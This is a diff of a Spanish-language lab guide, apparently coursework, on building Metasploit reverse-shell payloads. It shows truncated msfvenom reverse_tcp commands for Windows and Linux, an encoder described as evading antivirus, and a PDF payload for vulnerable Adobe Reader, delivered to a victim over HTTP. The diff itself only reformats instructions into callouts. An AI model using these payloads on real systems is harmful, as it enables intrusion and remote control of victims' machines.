@@ -140,9 +140,8 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.10.4 LPORT=2222 -e x86
 > [!NOTE]
 > El encoder Shikata_ga_nai es un encoder polimórfico que permite modificar el código del payload en múltiples formas. Esto hace que sea más difícil para los sistemas antivirus detectarlo, lo que mejora la posibilidad de que el payload pase desapercibido.
 
-Ponte en escucha con Metasploit usando el exploit handler con el mismo payload y puerto 2222
-
-Inicia el servidor HTTP en la máquina atacante y descarga el archivo en la víctima desde el navegador.
+> [!IMPORTANT]
+> Ponte en escucha con Metasploit usando el exploit handler con el mismo payload y puerto 2222. Inicia el servidor HTTP en la máquina atacante y descarga el archivo en la víctima desde el navegador.
 
 **¿Ha sido detectado el payload por Windows Defender?**
 
@@ -162,9 +161,8 @@ msfvenom --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.10.
 
 <br>
 
-Inicia el servidor HTTP en la máquina atacante y descarga el archivo en la víctima desde el navegador.
-
-Ponte en escucha con Metasploit usando el exploit handler con el mismo payload y puerto 3333
+> [!IMPORTANT]
+> Inicia el servidor HTTP en la máquina atacante y descarga el archivo en la víctima desde el navegador. Ponte en escucha con Metasploit usando el exploit handler con el mismo payload para Linux y puerto 3333
 
 Una vez descargado el archivo en la máquina Ubuntu, es necesario darle permisos de ejecución y ejecutarlo:
 ```
@@ -236,9 +234,8 @@ cp /home/secomu/.msf4/local/Activitat.pdf .
 
 <br>
 
-Ponte en escucha con Metasploit usando el exploit handler con el mismo payload y puerto 4444
-
-Inicia el servidor HTTP en la máquina atacante y descarga el archivo en la víctima desde el navegador.
+> [!IMPORTANT]
+> Ponte en escucha con Metasploit usando el exploit handler con el mismo payload y puerto 4444. Inicia el servidor HTTP en la máquina atacante y descarga el archivo en la víctima desde el navegador.
 
 Si la víctima abre el archivo PDF en una versión vulnerable de Adobe Reader, se ejecutará el payload y la máquina atacada se conectará automáticamente a Metasploit, otorgando una sesión Meterpreter.
 <p align="center">
